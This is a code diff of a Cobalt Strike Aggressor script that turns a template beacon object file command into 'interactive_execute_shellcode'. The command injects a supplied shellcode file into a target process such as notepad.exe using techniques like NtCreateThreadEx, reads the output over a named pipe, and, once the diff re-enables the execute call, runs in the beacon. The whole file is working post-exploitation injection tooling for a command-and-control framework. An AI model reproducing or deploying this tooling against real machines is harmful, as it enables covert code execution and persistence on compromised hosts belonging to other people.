@@ -1,9 +1,9 @@
 beacon_command_register(
-   "my_bof",
-   "Used to demonstrate the key value internal beacon APIs",
+   "interactive_execute_shellcode",
+   "Interactive shellcode injection - Using 3 injection technique, spawning a process, allocate memory and create a namepipe to read stdout to out process.",
 
    "Usage:\n" .
-   "   my_bof [options]\n\n" .
+   "   interactive_execute_shellcode [options]\n\n" .
 
    "Options (specified in any order):\n" .
    "   --process <process>            - specify a process to use for the BOF\n" .
@@ -11,10 +11,10 @@ beacon_command_register(
    "   --shellcode <shellcode file>   - specify the shellcode file to use\n\n" .
 
    "Examples:\n" .
-   "   my_bof --process default --technique technique1 --shellcode shellcode1\n"
+   "   interactive_execute_shellcode --process notepad.exe --technique NtCreateThreadEx --shellcode shellcode.bin\n"
 );
 
-alias my_bof {
+alias interactive_execute_shellcode {
    local('$bid @valid_opts %opts $opt_cnt $opt_ind $opt $value $barch $handle $data $args');
 
    %opts["--process"] = "default";
@@ -42,7 +42,7 @@ alias my_bof {
    }
 
     $barch  = barch($bid);
-    $handle = openf(script_resource("my_bof. $+ $barch $+ .o"));
+    $handle = openf(script_resource("interactive_execute_shellcode. $+ $barch $+ .o"));
     $data   = readb($handle, -1);
     closef($handle);
 
@@ -50,11 +50,12 @@ alias my_bof {
     $sc_data = readb($sc_handle, -1);
     closef($sc_handle);
 
-    $sc_len = strlen($sc_data);
+    $targetProcess = %opts["--process"];
+    $targetTechnique = %opts["--technique"]; 
 
-    $args = bof_pack($1, "pIzz", $sc_data, $sc_len, %opts["--process"], %opts["--technique"]);
+   $args = bof_pack($1, "bbb", $targetTechnique, $targetProcess, $sc_data);
 
-    btask($bid, "Running my_bof BOF using process: " . %opts["--process"] . ", technique: " . %opts["--technique"] . ", and shellcode: " . %opts["--shellcode"]);
+    btask($bid, "Running interactive_execute_shellcode BOF using process: " . $targetProcess . ", technique: " . $targetTechnique. ", and shellcode: " . %opts["--shellcode"]);
 
-    #beacon_inline_execute($bid, $data, "go", $args);
+    beacon_inline_execute($bid, $data, "go", $args);
 }
